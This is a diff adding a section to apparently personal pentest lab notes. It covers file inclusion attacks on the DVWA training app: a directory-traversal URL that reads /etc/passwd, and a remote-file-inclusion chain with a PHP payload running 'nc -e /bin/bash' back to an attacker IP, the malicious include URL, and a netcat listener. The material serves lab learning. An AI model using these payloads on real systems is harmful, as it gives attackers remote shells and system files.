@@ -277,6 +277,58 @@ You should get back a weevely shell. Type help to see a list of commands. You ca
 
 **File Inclusion Vulnerability**
 
+If the website is using a GET request we can use it to access files that we wouldn't normally be able to access, like the `/etc/passwd` 
+
+```sh
+http://<website-ip>/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd 
+```
+- I'm using the website IP here because that's what the DVWA site looks like, otherwise you would just use the normal address. 
+- We're also utilising directory traversal `../../`
+
+![](img/dvwa-file-inclusion.png)
+
+**Include Vulnerability**
+
+On the meatasploitable server we can check the `php.ini`file:
+```sh
+nano /etc/php5/cgi/php.ini
+```
+- We are looking for `allow_url_include = ON` 
+- You can search in Nano by using `CTL+W <string> Enter`
+
+Creating a pass-through function.php on Kali to grab from the dvwa site:
+```php
+<?php
+passthru(*nc -e /bin/bash <attacker-ip> -p 4444*);
+?>
+```
+- Now move the file to the Kali server `/var/www/html/file.php`
+
+Make sure your Kali server is running so dvwa can get the file:
+```sh
+sudo service apache2 start
+```
+
+Now on the dvwa site we can modify the url to look like this:
+```sh
+http://<website-ip>/dvwa/vulnerabilities/fi/?page=http://<attacker-ip>/file.php
+```
+- You might need to add a `?` at the end of the URL so the website runs the PHP code.
+- It may be required to turn it from a PHP file to a text file depending on what the server accepts, in that case you would need the `?`
+
+Start a listener:
+```sh
+nc -l -p 4444
+```
+
+Now use the URL on the DVWA website to hopefully get the reverse shell.
+
+---
+
+**Managing and Manipulating MySQL**
+
+
+
 
 
 
